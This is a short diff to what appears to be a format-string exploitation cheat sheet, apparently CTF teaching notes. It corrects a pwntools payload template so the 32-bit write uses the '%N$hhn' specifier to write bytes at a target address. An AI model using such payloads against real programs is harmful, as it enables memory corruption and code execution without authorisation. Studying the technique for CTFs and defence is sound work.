@@ -123,7 +123,7 @@ ___
 * Payload will look like:
 ```python
 from pwn import *
-inject = p32(target_address) + b"%Sx" + b"%N" # S = number of spaces to add, N = argument number
+inject = p32(target_address) + b"%Sx" + b"%N$hhn" # S = number of spaces to add, N = argument number
 ```
 
 ##### 64-bit:
